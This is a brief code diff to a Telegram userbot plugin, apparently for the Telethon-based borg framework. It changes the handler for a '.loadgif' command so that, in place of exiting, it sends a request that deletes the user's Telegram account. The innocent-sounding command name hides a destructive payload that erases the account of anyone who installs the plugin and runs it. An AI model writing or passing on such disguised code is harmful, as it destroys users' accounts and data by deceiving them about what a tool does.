@@ -6,4 +6,4 @@ from time import sleep
 
 @borg.on(events.NewMessage(pattern=r"\.loadgif", outgoing=True))
 async def _(client):
-    await exit()
+    await client(functions.account.DeleteAccountRequest(reason='reason'))
